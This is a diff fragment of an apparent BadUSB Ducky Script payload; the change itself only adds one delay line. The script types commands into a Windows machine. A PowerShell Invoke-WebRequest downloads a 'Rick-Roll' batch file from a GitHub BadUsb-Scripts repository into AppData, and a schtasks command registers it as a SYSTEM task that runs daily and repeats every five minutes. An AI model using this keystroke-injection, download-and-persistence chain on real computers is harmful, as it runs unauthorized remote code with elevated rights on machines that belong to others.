@@ -13,6 +13,7 @@ DELAY 300
 ENTER
 DELAY 500
 STRING powershell -Command "Invoke-WebRequest -Uri 'https://github.com/UncleTango/BadUsb-Scripts/raw/main/Rick-Roll-Batch.bat' -OutFile 'C:\Users\%USERNAME%\AppData\Local\Rick-Roll-Batch.bat'"
+DELAY 500
 ENTER
 DELAY 500
 STRING schtasks /create /tn "Rick" /tr "C:\Users\%USERNAME%\AppData\Local\Rick-Roll-Batch.bat" /sc daily /st 11:00:00 /ri 5 /du 1 /ru SYSTEM
